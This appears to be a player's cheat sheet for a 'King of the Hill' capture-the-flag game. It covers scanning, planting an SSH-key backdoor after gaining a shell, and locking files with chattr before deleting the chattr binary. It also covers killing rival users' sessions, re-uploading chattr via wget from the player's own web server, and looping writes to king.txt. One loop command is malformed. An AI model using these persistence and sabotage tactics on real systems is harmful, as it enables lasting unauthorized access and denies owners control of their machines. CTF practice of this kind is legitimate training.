Stragegy 

`try to get into root and echo your name on king.txt` `this gives you contant point which is better than finding flag`

Scan 

`do rustscan than namp` 
 `rustscan gives quicker scan result`
 
 backdoor 

`always make a backdoor once you get into the shell` 
 `incase someone kill you on shell` `or` `shell got disconnected you have your backdoor`
 
 how to create backdoor

`generate ssh keygen` `ssh-keygen`
 
 defend you ssh key
 
 `if someone finds your ssh there is high chance that they delete your key` `so it's better if you defend your ssh key`
 
 `try to put your ssh on some unexpected place like /etc /usr`
 
 `make your ssh immutable so that no one can delete` `with following command`
 
      chattr -R +i .ssh
      
 `now you likely to do is to delete the chattr binary from /usr/bin so that no one can make it mutable again`
 
 *Ultimate Defences*
 
 `now you need to defend your position`
 
`try the same` 
`once you put your name on king.txt` `make it immutable` `with the command chattr just like above on ssh` 

    chattr +i /root/king.txt
    
`now delete the chattr again` 

or 

Run a while loop to echo your name on king.txt so that if any one even change the name then after a second that king.txt again contains your name again

    while true; do echo "prakashchand72" > king.txt ; done 
 
now you can start find other flag

    find \ -name flag.txt 2>/dev/null
    
sometime you can also kill other user from shell
    
`type`

    who

`this shows the ip and pty number`
`find which is your pty and seeing your ip` `and start kill others pty`

    ps aux | grep "pty"

or

    ps aux | grep "ssh"
    
`now get the proccess of id of other and kill them`

    kill {pid no here}
    
commmunicate with others

`you can also broadcast the message to others on the shell with the wall command`

    wall hello this is prakash
    
Breaking the Defence 

 `if you got situation when someone does` `chattr +i king.txt` `then you can uplaod your own chattr and make it mutable again`
 
 `on your local machine go to your /usr/bin and transfer the file of chattr to the machine`
 
`something like` 

    python3 -m http.server 8080
    
    wget ip:8080/chattr 
    
    chmod +x chattr 
    
 `now on your king.txt`
 
    chattr -i king.txt

*Unbreakable Defence own exploit*

    while true; do "prakashchand72 is the king"; done 
    
    
 cc@ prakashchand72 
